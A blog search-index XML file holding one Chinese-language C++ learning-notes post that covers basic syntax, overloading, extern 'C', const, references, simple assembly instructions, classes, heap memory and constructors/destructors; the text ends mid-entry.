<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>C++学习笔记</title>
      <link href="2020/11/22/cPlus-learn-note/"/>
      <url>2020/11/22/cPlus-learn-note/</url>
      
        <content type="html"><![CDATA[<h1 id="程序执行的本质"><a href="#程序执行的本质" class="headerlink" title="程序执行的本质"></a>程序执行的本质</h1><p>当我们写完一段程序需要给电脑进行运行时，首先编译器需要将代码编译为CPU可以看懂的机器码然后装载到内存中，CPU读取到内存中的指令后就会执行其中的执行控制IO设备完成相应的工作。</p><p>CPU分为寄存器，运算器和控制器三部分。</p><h1 id="第一行c-代码"><a href="#第一行c-代码" class="headerlink" title="第一行c++代码"></a>第一行c++代码</h1><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;int main()&#123;    std::cout &lt;&lt; &quot;Hello World!\n&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175455.png" alt="image-20200730232556700"></p><h1 id="常用语法"><a href="#常用语法" class="headerlink" title="常用语法"></a>常用语法</h1><p>c++的源文件扩展名是cpp</p><p>c++程序的入口是main函数</p><p>c++完全兼容c</p><h2 id="cin、cout"><a href="#cin、cout" class="headerlink" title="cin、cout"></a>cin、cout</h2><p>需包含头文件 <code>#include &lt;iostream&gt;</code></p><p>cout表示输出，例如：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;int main()&#123;    cout &lt;&lt; &quot;Hello World!\n&quot;;    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175456.png" alt="image-20200805231612535"></p><p>其中<code>&lt;&lt;</code>表示左移运算符（位运算）</p><p>在c++中<code>endl</code>也表示换行，所以上述语句也可以写成：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;int main()&#123;    cout &lt;&lt; &quot;Hello World!&quot; &lt;&lt; endl;    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>cin表示从键盘输入，例如：</p><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">#include &lt;iostream&gt;using namespace std;int main()&#123;    int age;    cin &gt;&gt; age;    cout &lt;&lt; &quot;age is: &quot; &lt;&lt; age &lt;&lt; endl;    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175457.png" alt="image-20200805232400967"></p><p>其中<code>&gt;&gt;</code>表示有移运算符</p><h2 id="getchar"><a href="#getchar" class="headerlink" title="getchar()"></a>getchar()</h2><p>等待用户输入</p><h1 id="函数重载（overload）"><a href="#函数重载（overload）" class="headerlink" title="函数重载（overload）"></a>函数重载（overload）</h1><p>当一个项目中存在多个函数，这些函数的函数名相同，但是函数传入的个数和类型不同，c++会自动按照函数传入的个数和类型寻找对应的函数进行运算，这个过程称为函数重载。</p><p>例如：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;int sum(int v1, int v2) &#123;    return v1 + v2;&#125;int sum(int v1, int v2, int v3) &#123;    return v1 + v2 + v3;&#125;int main()&#123;    cout &lt;&lt; sum(10, 20) &lt;&lt; endl;    cout &lt;&lt; sum(10, 20, 30) &lt;&lt; endl;    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175458.png" alt="image-20200806233223696"></p><p>sum函数随着传入的实参个数不同会自动寻找对应的函数去计算。</p><p>返回值类型与函数重载无关。</p><p>在c语言中是不支持函数重载的。</p><h1 id="默认参数"><a href="#默认参数" class="headerlink" title="默认参数"></a>默认参数</h1><p>c++允许函数设置默认参数，在调用时可以根据情况省略实参，规则如下：</p><ul><li>默认参数只能按照右到左的顺序</li><li>如果函数同时有声明，实现，默认参数只能放在函数声明中</li><li>默认参数的值可以时常量，全局符号（全局变量，函数名）</li></ul><p>例：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;int sum(int v1 &#x3D; 5, int v2 &#x3D; 6) &#123;    return v1 + v2;&#125;int main()&#123;       cout &lt;&lt; sum() &lt;&lt; endl;    cout &lt;&lt; sum(10) &lt;&lt; endl;    cout &lt;&lt; sum(10, 20) &lt;&lt; endl;    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175459.png" alt="image-20200809171135938"></p><h1 id="extern-“C”"><a href="#extern-“C”" class="headerlink" title="extern “C”"></a>extern “C”</h1><p>被extern c 修饰的代码会按照c语言的方式进行编译。</p><p>例：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;extern &quot;C&quot; &#123;    void func() &#123;    &#125;    void func(int v1) &#123;    &#125;&#125;int main()&#123;       return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的两个函数使用<code>extern  “c”</code>修饰后就会使用c语言的方式进行编译，但是由于c语言不支持函数重载，所以编译会报错。</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175500.png" alt="image-20200809233222821"></p><ul><li>如果函数通过是有声明和实现，要让函数声明被<code>extern &quot;c&quot;</code>修饰，函数实现可以不修饰。</li></ul><p>何时需要用到 <code>extern c</code> ？</p><ol><li>用在c，c++的混合开发中，如果用到一些第三方的c语言库，那么就可以使用 extern c</li><li></li></ol><p>例：</p><p>现在有一个c文件内容为：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;math.h></span></span><span class="token keyword">int</span> <span class="token function">sum</span><span class="token punctuation">(</span><span class="token keyword">int</span> v1<span class="token punctuation">,</span> <span class="token keyword">int</span> v2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> v1 <span class="token operator">+</span> v2<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">delta</span><span class="token punctuation">(</span><span class="token keyword">int</span> v1<span class="token punctuation">,</span> <span class="token keyword">int</span> v2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> v1 <span class="token operator">-</span> v2<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果在c++中需要调用这个c文件中的函数，那么c++文件应该这么写：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;extern &quot;C&quot;&#123;int sum(int v1, int v2);int delta(int v1, int v2);&#125;int main()&#123;cout &lt;&lt; sum(10, 20) &lt;&lt; endl;cout &lt;&lt; delta(50, 10) &lt;&lt; endl;return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175501.png" alt="image-20200810234941950"></p><p><strong>也就是声明必须用<code>extern &quot;c&quot; </code>包裹，否则编译会报错</strong></p><p>为了方便调用，可以将声明放到头文件中，新建头文件<code>math.h</code>:</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175502.png" alt="image-20200810235310952"></p><p>然后c++中include此头文件即可：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175503.png" alt="image-20200810235356433"></p><h1 id="ifdef"><a href="#ifdef" class="headerlink" title="ifdef"></a>ifdef</h1><p>为了使只有c++调用<code>math.h</code>头文件时才加<code>extern “c”</code>，可以使用<code>#ifdef</code>进行判断</p><blockquote><p>c++文件默认都会有一个宏定义 #define  __cplusplus</p></blockquote><p>然后头文件就可以这样写：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#ifdef __cplusplusextern &quot;C&quot; &#123;#endif    int sum(int v1, int v2);int delta(int v1, int v2);#ifdef __cplusplus&#125;#endif<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="pragma-once"><a href="#pragma-once" class="headerlink" title="pragma once"></a>pragma once</h1><p><code># pragma once</code>是用来防止头文件被重复包含</p><p>例如在某个程序中多次写了包含头文件，在头文件中写了<code># pragma once</code>就可以防止头文件中的内容被多次编译。</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175504.png" alt="image-20200811230751965"></p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175505.png" alt="image-20200811231052639"></p><h1 id="内联函数"><a href="#内联函数" class="headerlink" title="内联函数"></a>内联函数</h1><p>使用<code>inline</code>修饰函数的声明或实现，可以使其变成内联函数</p><p>建议声明和实现都增加<code>inline修饰</code></p><p>特点：</p><ul><li>编译器会将函数调用直接展开为函数体代码</li><li>可以减少函数调用的开销</li><li>会增大代码体积</li></ul><p>注意：</p><ul><li>尽量不要内联超过10行代码的函数</li><li>有些函数即使声明为<code>inline</code>,也不一定会被编译器内联，比如递归函数</li></ul><p><strong>内联函数和宏的区别</strong></p><ul><li>内联函数和宏，都可以减少函数调用的开销</li></ul><p>例如：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;#define sum(v1,v2) v1 + v2int main()&#123;int c &#x3D; sum(10, 20);cout &lt;&lt; c &lt;&lt; endl;return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175506.png" alt="image-20200812224311285"></p><p>上述代码也可以正常运行</p><ul><li>对比宏，内联函数多了语法检测和函数特性</li><li>宏只是简单的文本替换，所以遇到计算尽量使用函数</li></ul><h1 id="const"><a href="#const" class="headerlink" title="const"></a>const</h1><p>const是常量的意思，被其修饰的变量不可修改。</p><ul><li>如果修饰的是类、结构体（的指针），其成员也不可以更改</li><li>const修饰的其右边的内容</li></ul><p>一下5个指针的分别是什么含义？</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int age &#x3D; 10;const int *p0 &#x3D; &amp;age;int const *p1 &#x3D; &amp;age;int * const p2 &#x3D; &amp;age;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>例如：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;int main()&#123;    int age &#x3D; 10;    int heigh &#x3D; 20;    int * const p2 &#x3D; &amp;age;    *p2 &#x3D; 30; &#x2F;&#x2F;age&#x3D;30    p2 &#x3D; &amp;heigh;  &#x2F;&#x2F;报错    *p2 &#x3D; 40; &#x2F;&#x2F;heigh &#x3D; 40    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175507.png" alt="image-20200813223143851"></p><p>报错的原因是const修饰的是其右边的内容，const修饰的是p2所以<code>p2=&amp;heigh</code>报错，而<code>*p2=30</code>就不会报错.</p><h1 id="引用-reference"><a href="#引用-reference" class="headerlink" title="引用(reference)"></a>引用(reference)</h1><p>在C语言中，使用指针（Pointer）可以间接获取、修改某个变量的值</p><p>例：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;int main()&#123;    int age &#x3D; 10;    int* p &#x3D; &amp;age;    *p &#x3D; 20;    cout &lt;&lt; age &lt;&lt; endl;    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175508.png" alt="image-20200813224428027"></p><p>在C++中，使用引用（Reference）可以起到跟指针类似的功能</p><p>例：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;int main()&#123;    int age &#x3D; 10;    &#x2F;&#x2F;定义一个age的引用    int &amp;refAge &#x3D; age;    refAge &#x3D; 20;    cout &lt;&lt; age &lt;&lt; endl;    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175509.png" alt="image-20200813224851288"></p><ul><li>引用相当于是变量的别名（基本数据类型、枚举、结构体、类、指针、数组等，都可以有引用）</li><li>对引用做计算，就是对引用所指向的变量做计算</li><li>在定义的时候就必须初始化，一旦指向了某个变量，就不可以再改变，“从一而终”</li><li>可以利用引用初始化另一个引用，相当于某个变量的多个别名</li><li>不存在【引用的引用、指向引用的指针、引用数组】</li></ul><p><strong>引用存在的价值之一：比指针更安全、函数返回值可以被赋值</strong></p><p>例：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;void swap(int &amp;v1, int &amp;v2) &#123;int tmp &#x3D; v1;v1 &#x3D; v2;v2 &#x3D; tmp;&#125;int main()&#123;int a &#x3D; 10;int b &#x3D; 20;swap(a, b);cout &lt;&lt; &quot;a&#x3D; &quot; &lt;&lt; a &lt;&lt; &quot;  b&#x3D; &quot; &lt;&lt; b &lt;&lt; endl;return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175510.png" alt="image-20200813230443222"></p><p>上述代码就轻松完成了在主函数内部使用用swap函数完成a和b的值的替换，使得<strong>swap函数访问了它函数外部的值</strong>。</p><h1 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h1><p>汇编语言的种类：</p><ul><li>8086汇编（16bit）</li><li>x86汇编（32bit）</li><li>x64汇编（64bit）</li><li>ARM汇编（嵌入式、移动设备</li></ul><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175511.png" alt="image-20200824224209480"></p><p>通常，CPU会将内存中的数据存到寄存器中，然后在对寄存器中的数据进行运算</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175512.png" alt="image-20200824224424116"></p><h2 id="x64汇编-寄存器"><a href="#x64汇编-寄存器" class="headerlink" title="x64汇编-寄存器"></a>x64汇编-寄存器</h2><p>RAX RBX RCX RDX 为通用寄存器</p><p>X64架构的寄存器，一个寄存器可以存8个字节的数据</p><p>x86架构下的通用寄存器为：EAX EBX ECX EDX ,为了兼容32位的CPU架构，拿出了最低四个字节来存放EAX的数据</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175513.png" alt="image-20200824225301214"></p><h2 id="内联汇编"><a href="#内联汇编" class="headerlink" title="内联汇编"></a>内联汇编</h2><p>在c++中嵌入汇编代码称为内联汇编，汇编代码使用<code>__asm</code>包裹。</p><p>例如：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;int main()&#123;int a &#x3D; 10;__asm &#123;mov eax, 10&#125;return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="mov指令"><a href="#mov指令" class="headerlink" title="mov指令"></a>mov指令</h2><p><code>mov dest, src</code><br>将src的内容赋值给dest，类似于dest = src</p><p><code>[ 地址值 ]</code><br>中括号[ ]里面放的都是内存地址</p><p>word是2字节，dword是4字节（double word），qword是8字节（quad word）</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">mov dword ptr [a],0Ah  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>表示将10放到内存地址为a的存储空间中，并占用4个字节</p><h2 id="call函数地址"><a href="#call函数地址" class="headerlink" title="call函数地址"></a>call函数地址</h2><p>call 表示调用函数</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175514.png" alt="image-20200826232903520"></p><h2 id="lea指令"><a href="#lea指令" class="headerlink" title="lea指令"></a>lea指令</h2><p><code>lea dest, [ 地址值 ]</code></p><p>将地址值赋值给dest，类似于dest = 地址值</p><p>lea是直接赋值地址值，而mov是取内存地址中存放的东西</p><p>例：</p><pre class="line-numbers language-none"><code class="language-none">mov eax, dword ptr [1122H]表示取出[1122H]这个内存地址中存放的东西赋值给eaxlea eax, [1122H]表示直接将1122H赋值给eax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ret"><a href="#ret" class="headerlink" title="ret"></a>ret</h2><p>ret表示函数返回</p><h2 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h2><p><code>xor op1, op2</code></p><p>将op1和op2异或的结果赋值给op1，类似于op1 = op1 ^ op2</p><h2 id="add"><a href="#add" class="headerlink" title="add"></a>add</h2><p><code>add op1, op2</code></p><p>类似于op1 = op1 + op2</p><h2 id="sub"><a href="#sub" class="headerlink" title="sub"></a>sub</h2><p><code>sub op1, op2</code></p><p>类似于op1 = op1 - op2</p><h2 id="inc"><a href="#inc" class="headerlink" title="inc"></a>inc</h2><p><code> inc op</code></p><p>自增，类似于op = op + 1</p><h2 id="des"><a href="#des" class="headerlink" title="des"></a>des</h2><p><code>dec op</code></p><p>自减，类似于op = op – 1</p><h2 id="jmp"><a href="#jmp" class="headerlink" title="jmp"></a>jmp</h2><p>jmp 内存地址</p><p>跳转到某个内存地址去执行代码</p><p>j开头的一般都是跳转，大多数是带条件的跳转，一般跟test、cmp等指令配合使用</p><h1 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h1><h2 id="类的定义"><a href="#类的定义" class="headerlink" title="类的定义"></a>类的定义</h2><p>C++中可以使用struct、class来定义一个类<br><strong>struct和class的区别:</strong><br>struct的默认成员权限是public<br>class的默认成员权限是private</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;&#x2F;&#x2F;类的定义struct Person&#123;&#x2F;&#x2F;成员变量int m_age;&#x2F;&#x2F;成员函数void run() &#123;cout &lt;&lt; m_age &lt;&lt; &quot;run&quot; &lt;&lt; endl;&#125;&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">class Person &#123;public:&#x2F;&#x2F;成员变量int m_age;&#x2F;&#x2F;成员函数void run() &#123;cout &lt;&lt; m_age &lt;&lt; &quot;run&quot; &lt;&lt; endl;&#125;&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="类的实例化"><a href="#类的实例化" class="headerlink" title="类的实例化"></a>类的实例化</h2><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int main()&#123;Person person;person.m_age &#x3D; 20;person.run();return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="对象的内存布局"><a href="#对象的内存布局" class="headerlink" title="对象的内存布局"></a>对象的内存布局</h2><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175515.png" alt="image-20201011232945088"></p><h2 id="this"><a href="#this" class="headerlink" title="this"></a>this</h2><p>this是指向当前对象的指针</p><p>对象在调用成员函数的时候，会自动传入当前对象的内存地址</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;&#x2F;&#x2F;类的定义class Person &#123;public:&#x2F;&#x2F;成员变量int m_age;&#x2F;&#x2F;成员函数void run() &#123;cout &lt;&lt; this-&gt;m_age &lt;&lt; &quot;run()&quot; &lt;&lt; endl;&#125;&#125;;int main()&#123;Person person1;person1.m_age &#x3D; 20;person1.run();Person person2;person2.m_age &#x3D; 30;person2.run();return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如上面的例子，当存在两个Person对象时，不同的对象在调用同一个<code>run()</code>方法时是如何寻找到属于自己的m_age的呢？就是靠this这个指针，this默认指向当前对象的内存地址，为当前对象寻找对应方法。this是一个隐式参数，其实不写this也可以正常执行，如下：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;&#x2F;&#x2F;类的定义class Person &#123;public:&#x2F;&#x2F;成员变量int m_age;&#x2F;&#x2F;成员函数void run() &#123;cout &lt;&lt; m_age &lt;&lt; &quot;run()&quot; &lt;&lt; endl;&#125;&#125;;int main()&#123;Person person1;person1.m_age &#x3D; 20;person1.run();Person person2;person2.m_age &#x3D; 30;person2.run();return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175516.png" alt="image-20201012000235903"></p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175517.png" alt="image-20201012000303084"></p><h2 id="指针访问对象成员的本质"><a href="#指针访问对象成员的本质" class="headerlink" title="指针访问对象成员的本质"></a>指针访问对象成员的本质</h2><p>待补充</p><h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><p> 封装的含义是成员变量私有化，提供公共的getter和setter给外界去访问成员变量。</p><p>例：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;&#x2F;&#x2F;类的定义class Person &#123;private:&#x2F;&#x2F;成员变量int m_age;public:void setAge(int age) &#123;if (age&lt;&#x3D;0)&#123;m_age &#x3D; 1;&#125;else &#123;m_age &#x3D; age;&#125;&#125;int getAge()&#123;return m_age;&#125;&#125;;int main()&#123;Person person;person.setAge(-4);cout &lt;&lt; person.getAge() &lt;&lt; endl;return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175518.png" alt="image-20201018224547218"></p><h2 id="内存空间布局"><a href="#内存空间布局" class="headerlink" title="内存空间布局"></a>内存空间布局</h2><p> 每个应用都有自己独立的内存空间，其内存空间一般都有以下几大区域：<br><strong>代码段（代码区）</strong><br>用于存放代码<br><strong>数据段（全局区</strong>）<br>用于存放全局变量等<br><strong>栈空间</strong><br> 每调用一个函数就会给它分配一段连续的栈空间，等函数调用完毕后会自动回收这段栈空间<br>自动分配和回收<br><strong>堆空间</strong><br>需要主动去申请和释放</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175519.png" alt="image-20201018225324764"></p><h2 id="堆空间"><a href="#堆空间" class="headerlink" title="堆空间"></a>堆空间</h2><p>在程序运行过程，为了能够自由控制内存的生命周期、大小，会经常使用堆空间的内存</p><p>堆空间的申请\释放（malloc \ free）</p><p>例：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;int main()&#123;&#x2F;&#x2F;申请四个字节的内存空间用来存储整形数据，&#x2F;&#x2F;由于malloc申请的内存默认都为void * ，所以需要强转int * p &#x3D; (int *) malloc(4);* p &#x3D; 11;cout &lt;&lt; * p &lt;&lt; endl;free(p);return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175520.png" alt="image-20201018231207004"></p><p>或申请一个char类型的内存</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;int main()&#123;char * p &#x3D; (char *) malloc(4);*p &#x3D; &#39;a&#39;;*(p + 1) &#x3D; 10;*(p + 2) &#x3D; 11;*(p + 3) &#x3D; 12;cout &lt;&lt; * p &lt;&lt; endl;free(p);return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175521.png" alt="image-20201018231758381"></p><p>除此外c++还支持new/delete方式申请内存</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;int main()&#123;int *p &#x3D; new int;*p &#x3D; 10;cout &lt;&lt; * p &lt;&lt; endl;delete p;return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175522.png" alt="image-20201018232104341"></p><p><strong>注意</strong></p><ul><li>申请堆空间成功后，会返回那一段内存空间的地址</li><li>申请和释放必须是1对1的关系，不然可能会存在内存泄露</li></ul><h2 id="堆空间的初始化"><a href="#堆空间的初始化" class="headerlink" title="堆空间的初始化"></a>堆空间的初始化</h2><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175523.png" alt="image-20201022223317787"></p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175524.png" alt="image-20201022223322607"></p><p>memset函数是将较大的数据结构（比如对象、数组等）内存清零的比较快的方法。</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175525.png" alt="image-20201022224249246"></p><h2 id="对象的内存"><a href="#对象的内存" class="headerlink" title="对象的内存"></a>对象的内存</h2><p>对象的内存可以存在于3种地方：</p><ul><li>全局区（数据段）：全局变量</li><li>栈空间：函数里面的局部变量</li><li>堆空间：动态申请内存（malloc、new等）</li></ul><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175526.png" alt="image-20201022224656159"></p><h2 id="构造函数（Constructor）"><a href="#构造函数（Constructor）" class="headerlink" title="构造函数（Constructor）"></a>构造函数（Constructor）</h2><p>构造函数（也叫构造器），在对象创建的时候自动调用，一般用于完成对象的初始化工作</p><p>例：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;class Person &#123;public:int m_age;Person() &#123;cout &lt;&lt; &quot;Person()&quot; &lt;&lt; endl;&#125;&#125;;int main()&#123;Person person;Person person1;Person person2;return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175527.png" alt="image-20201022230951621"></p><p>可看到在对象初始化时就会自动调用构造函数。</p><p><strong>特点</strong></p><ul><li>函数名与类同名，无返回值（void都不能写），可以有参数，可以重载，可以有多个构造函数</li><li>一旦自定义了构造函数，必须用其中一个自定义的构造函数来初始化对象</li></ul><p><strong>注意</strong>:</p><p>通过malloc分配的对象不会调用构造函数</p><h2 id="析构函数（Destructor）"><a href="#析构函数（Destructor）" class="headerlink" title="析构函数（Destructor）"></a>析构函数（Destructor）</h2><p> 析构函数（也叫析构器），在对象销毁的时候自动调用，一般用于完成对象的清理工作。</p><p>函数名以<code>~</code>开头，与类同名，无返回值（void都不能写），无参，不可以重载，有且只有一个析构函数</p><p>例：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;class Person &#123;public:int m_age;Person() &#123;cout &lt;&lt; &quot;Person()&quot; &lt;&lt; endl;&#125;&#x2F;&#x2F;一个Person对象销毁的象征~Person() &#123;cout &lt;&lt; &quot;~Persoon()&quot; &lt;&lt; endl;&#125;&#125;;int main()&#123;Person person;Person person1;Person person2;return 0;&#125;<span aria-hidden="true" 